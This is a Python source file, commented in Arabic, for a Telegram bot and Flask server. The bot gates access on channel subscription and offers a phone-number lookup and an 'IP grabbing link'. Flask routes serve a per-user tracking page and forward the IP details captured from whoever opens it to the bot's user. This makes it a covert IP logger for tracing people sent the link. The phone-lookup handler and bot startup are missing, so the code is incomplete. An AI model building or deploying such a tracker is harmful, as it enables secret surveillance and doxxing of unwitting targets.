import json
import requests
import telebot
from telebot import types
from flask import Flask, render_template, request

# ------------------ تحميل الإعدادات ------------------
def load_config():
    with open('config.json', 'r', encoding='utf-8') as f:
        return json.load(f)

config = load_config()
BOT_TOKEN = config['bot_token']
OWNER_ID = int(config['owner_id'])
CHANNEL_USERNAME = config['channel_username']
WELCOME_MSG = config.get('welcome_msg', {})
ABSTRACT_API_KEY = config['abstract_api_key']

bot = telebot.TeleBot(BOT_TOKEN)
user_states = {}

# ------------------ إعداد Flask ------------------
app = Flask(__name__, template_folder='templates')

# ------------------ التحقق من الاشتراك ------------------
def check_subscription(user_id):
    try:
        member = bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
        return member.status in ['member', 'creator', 'administrator']
    except:
        return False

# ------------------ القائمة الرئيسية ------------------
def show_main_menu(chat_id, lang):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("معلومات عن رقم الهاتف", "رابط سحب الآيبي")
    markup.row("إلغاء")

    messages = {
        "ar": "🔍 اختر أحد الخيارات:",
        "en": "🔍 Choose an option:",
        "ku": "🔍 Hilbijêre yek ji vebijarkên"
    }

    bot.send_message(chat_id, messages.get(lang, "🔍 Choose an option:"), reply_markup=markup)

# ------------------ أمر /start ------------------
@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id
    user_lang = message.from_user.language_code

    if user_id == OWNER_ID or check_subscription(user_id):
        show_main_menu(user_id, user_lang)
    else:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row("تحقق من الاشتراك")

        welcome_message = WELCOME_MSG.get(user_lang, WELCOME_MSG.get('ar', "أهلاً بك في البوت!"))
        bot.send_message(
            user_id,
            f"{welcome_message}\n\n"
            f"رابط القناة: https://t.me/{CHANNEL_USERNAME}\n"
            f"بعد الاشتراك اضغط على 'تحقق من الاشتراك'",
            reply_markup=markup
        )

# ------------------ تحقق من الاشتراك ------------------
@bot.message_handler(func=lambda msg: msg.text == "تحقق من الاشتراك")
def verify_subscription(message):
    user_lang = message.from_user.language_code
    if check_subscription(message.from_user.id):
        show_main_menu(message.chat.id, user_lang)
    else:
        messages = {
            "ar": f"❌ لم يتم التحقق، يرجى الاشتراك في القناة: @{CHANNEL_USERNAME}",
            "en": f"❌ Not verified, please subscribe to the channel: @{CHANNEL_USERNAME}",
            "ku": f"❌ Nehat verifîkê kirin, ji kerema xwe abone bibe bo kanalê: @{CHANNEL_USERNAME}"
        }
        bot.send_message(message.chat.id, messages.get(user_lang, messages['ar']))

# ------------------ صفحة رابط سحب الآيبي ------------------
@app.route("/ip-info/<user_id>")
def ip_info(user_id):
    return render_template('ip_info.html', user_id=user_id)

# ------------------ استقبال بيانات الآيبي ------------------
@app.route('/send_ip_info', methods=['POST'])
def send_ip_info():
    user_id = request.form['user_id']
    ip_info = request.form['ip_info']
    
    bot.send_message(user_id, f"تم التقاط المعلومات التالية: {ip_info}")
    return "تم إرسال المعلومات بنجاح!"

# ------------------ تأكيد عمل الخادم ------------------
@app.route('/start')
def start():
    return 'خادم البوت يعمل'

# ------------------ تشغيل Flask ------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
